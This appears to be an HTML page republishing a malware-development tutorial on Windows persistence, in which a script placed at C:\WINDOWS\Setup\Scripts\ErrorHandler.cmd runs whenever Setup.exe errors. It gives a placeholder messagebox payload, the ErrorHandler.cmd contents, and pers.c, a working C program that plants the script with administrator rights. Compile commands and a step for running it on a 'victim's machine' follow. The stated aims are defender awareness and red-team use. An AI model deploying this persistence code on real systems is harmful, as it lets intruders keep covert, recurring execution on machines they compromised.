@@ -1,0 +1,144 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Malware development: persistence - part 22. Windows Setup.</title><link rel="stylesheet" href="../../content.css"><script src="../../content.js" defer></script></head><body><main class="lesson">
+    <div class="p-4 sm:p-5 my-6 rounded-2xl bg-[var(--accent-soft)] border border-[var(--accent)] text-[#f0f3ff] flex items-start gap-3 shadow-2xl">
+        <i data-lucide="book-marked" class="w-5 h-5 text-[var(--accent)] flex-shrink-0 mt-0.5"></i>
+        <div class="text-xs sm:text-sm leading-relaxed space-y-1">
+            <div class="font-bold text-[var(--accent)] uppercase tracking-wide">MD-MZ Research Field Note #44</div>
+            <div class="text-[#e2e8f0]">Technical research note on <strong class="text-white">Malware development: persistence - part 22. Windows Setup.</strong> covering source code implementations, evasion mechanics, and practical attack surface analysis.</div>
+        </div>
+    </div>
+    <p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Simple C++ example.</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">This post is based on my own research into one of the more interesting malware persistence tricks: via Windows Setup script. setup script C:\WINDOWS\system32\oobe\Setup.exe is an executable file on the Windows operating system. The oobe directory stands for “Out Of Box Experience,” which is part of the process users go through when they are setting up Windows for the first time, such as creating a user account, setting preferences, choosing default settings, etc.</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Turns out, if you place your payload in c:\WINDOWS\Setup\Scripts\ErrorHandler.cmd, c:\WINDOWS\system32\oobe\Setup.exe will load it whenever an error occurs.</p>
+
+            <div id="practical-example" class="scroll-mt-24 pt-6 pb-2 border-b border-[#212b54] mt-8 mb-4">
+                <h3 class="text-base sm:text-lg font-bold text-white flex items-center gap-2">
+                    <i data-lucide="sparkles" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i>
+                    <span>Practical example</span>
+                </h3>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Let’s go to look at a practical example. First of all, as usually, create “evil” application. For simplicity, as usually, it’s meow-meow messagebox “malware” application (hack.c):</p>
+
+            <div class="my-6 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs">
+                <div class="flex items-center justify-between px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                    <div class="flex items-center gap-2 text-[var(--accent)] font-semibold text-xs tracking-wider uppercase">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5"></i>
+                        <span>C / C++ Source</span>
+                    </div>
+                    <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-3 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition">
+                        <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                        <span>Copy</span>
+                    </button>
+                </div>
+                <pre class="p-4 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono"><code class="language-c">/*
+hack.c
+evil app for windows persistence
+author: @cocomelonc
+https://cocomelonc.github.io/malware/2023/07/16/malware-pers-22.html
+*/
+#include &lt;windows.h&gt;
+#pragma comment (lib, "user32.lib")
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
+LPSTR lpCmdLine, int nCmdShow) {
+MessageBox(NULL, "Meow-meow!", "=^..^=", MB_OK);
+return 0;
+}
+And, then just create file ErrorHandler.cmd for persistence:
+@echo off
+"C:\Users\user\Desktop\research\2023-07-16-malware-pers-22\hack.exe"</code></pre>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">As you can see, the logic is pretty simple.</p>
+
+            <div id="demo" class="scroll-mt-24 pt-6 pb-2 border-b border-[#212b54] mt-8 mb-4">
+                <h3 class="text-base sm:text-lg font-bold text-white flex items-center gap-2">
+                    <i data-lucide="sparkles" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i>
+                    <span>Demo</span>
+                </h3>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Let’s go to see everything in action. First of all, compile our “malware”: x86_64-w64-mingw32-g++ -O2 hack.c -o hack.exe \ -I/usr/share/mingw-w64/include/ -s \ -ffunction-sections -fdata-sections \ -Wno-write-strings -fno-exceptions \ -fmerge-all-constants -static-libstdc++ \ -static-libgcc -fpermissive</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Then, move our ErrorHandler.cmd to C:\Windows\Setup\Scripts\:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Ok, the next step, need to run Setup.exe with error. The simplest method is to execute Setup.exe without any arguments: .\Setup.exe</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">If we open Process Hacker and see properties of hack.exe:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">we can notice that its parent process is cmd.exe (7264),</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">In turn, its parent is the Setup.exe (4876) process:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">As you can see, our persistence logic works perfectly! =.. =</p>
+
+            <div id="practical-example-2-persistence-script" class="scroll-mt-24 pt-6 pb-2 border-b border-[#212b54] mt-8 mb-4">
+                <h3 class="text-base sm:text-lg font-bold text-white flex items-center gap-2">
+                    <i data-lucide="sparkles" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i>
+                    <span>Practical example 2. persistence script</span>
+                </h3>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">For the sake of completeness of the experiment, I created a file pers.c:</p>
+
+            <div class="my-6 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs">
+                <div class="flex items-center justify-between px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                    <div class="flex items-center gap-2 text-[var(--accent)] font-semibold text-xs tracking-wider uppercase">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5"></i>
+                        <span>C / C++ Source</span>
+                    </div>
+                    <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-3 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition">
+                        <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                        <span>Copy</span>
+                    </button>
+                </div>
+                <pre class="p-4 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono"><code class="language-c">/*
+pers.c
+windows persistence via Windows Setup
+author: @cocomelonc
+https://cocomelonc.github.io/malware/2023/07/16/malware-pers-22.html
+*/
+#include &lt;windows.h&gt;
+#include &lt;stdio.h&gt;
+int main(int argc, char* argv[]) {
+// create the directory if not exist
+
+if (!CreateDirectory("C:\\WINDOWS\\Setup\\Scripts", NULL)) {
+DWORD error = GetLastError();
+if (error != ERROR_ALREADY_EXISTS) {
+printf("failed to create directory. error: %lu\n", error);
+return -1;
+}
+}
+// open the file for writing
+HANDLE hFile = CreateFile("C:\\WINDOWS\\Setup\\Scripts\\ErrorHandler.cmd",
+GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+if (hFile == INVALID_HANDLE_VALUE) {
+printf("failed to create ErrorHandler file. error: %lu\n", GetLastError());
+return -1;
+}
+// content to write to the file
+const char* data = "@echo
+off\n\"C:\\Users\\user\\Desktop\\research\\2023-07-16-malware-pers-22\\
+hack.exe\"";
+// write the content to the file
+DWORD bytesWritten;
+if (!WriteFile(hFile, data, strlen(data), &amp;bytesWritten, NULL)) {
+printf("failed to write to ErrorHandler file. error: %lu\n",
+GetLastError());
+}
+// close the file handle
+CloseHandle(hFile);
+return 0;
+}
+Note that, this program needs to be run with administrator rights as it’s trying to create
+a directory and a file under C:\WINDOWS, which requires administrative privileges.
+
+demo 2</code></pre>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Let’s go to see everything in action. Compile our persistence script: x86_64-w64-mingw32-g++ -O2 pers.c -o pers.exe \ -I/usr/share/mingw-w64/include/ -s \ -ffunction-sections -fdata-sections \ -Wno-write-strings -fno-exceptions \ -fmerge-all-constants -static-libstdc++ \ -static-libgcc -fpermissive</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Then, just run it with administrative privileges on the victim’s machine: .\pers.exe</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">In my case, before run it I deleted this folder:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Run, Setup.exe again:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Perfect! =.. =</p>
+
+            <div id="conclusion" class="scroll-mt-24 pt-6 pb-2 border-b border-[#212b54] mt-8 mb-4">
+                <h3 class="text-base sm:text-lg font-bold text-white flex items-center gap-2">
+                    <i data-lucide="sparkles" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i>
+                    <span>Conclusion</span>
+                </h3>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">This is a common filename for an installer package. In this case, it’s part of Windows’s setup and initialization process. It’s used during the installation of the operating system, as well as when adding or modifying features and components. As you can see, however, please note that although it is a legitimate part of the Windows operating system, malicious programs can sometimes name themselves Setup.exe to avoid detection.</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">There are also other files to inside the c:\WINDOWS\system32\oobe\ folder:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">I have not checked them. This trick has been previously researched by hexacorn:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">, I just show the dirty PoC code in C: pers.c. I hope this post spreads awareness to the blue teamers of this interesting technique, and adds a weapon to the red teamers arsenal. Malware persistence: part 1 https://www.hexacorn.com/blog/2022/01/16/beyond-good-ol-run-key-part-135/ https://twitter.com/Hexacorn/status/1482484486994640896 source code in github</p></main></body></html>
